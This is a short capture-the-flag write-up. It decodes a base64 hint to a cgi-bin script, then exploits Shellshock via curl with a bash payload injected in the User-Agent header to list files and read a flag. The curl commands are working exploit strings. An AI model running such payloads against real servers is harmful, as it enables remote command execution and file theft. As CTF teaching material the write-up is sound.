<img src="https://imgur.com/NS6QZ4p.png"/>

Looking at the source code we find base64 encoded text

```
Like the way you think spidey Y2dpLWJpbi90ZXN0LnNo 
```

On decoding

<img src="https://imgur.com/XVHZYRf.png"/>

I search on google about `cgi-bin` and found that they are mostly vulnerable to `shellshock` that allows execution of bash commands

On refering to this blog post

`https://wywyit.medium.com/ritsec-fall-2018-ctf-week-6-45d414035c76`


I used

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'find / -type "*.txt"'" http://challenges.ctfd.io:30328/cgi-bin/test.sh
```

And it gave me a bunch of files

<img src="https://imgur.com/VxDcMQi.png"/>

At the bottom I found

```
/usr/lib/python3.8/LICENSE.txt                                            
/tmp/bash-4.3/doc/article.txt                                             
/tmp/bash-4.3/doc/fdl.txt                                                 
/tmp/bash-4.3/examples/INDEX.txt                                          
/home/admin/root.txt                                                                                                                                
/home/herman/user.txt  
```

```
Bsides Islamabad# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /home/herman/user.txt'" http://challenges.ctfd.io:30328/cgi-bin/test.sh

Bsides-PK-Fl4g{sinister_six}
```
And that was our flag !
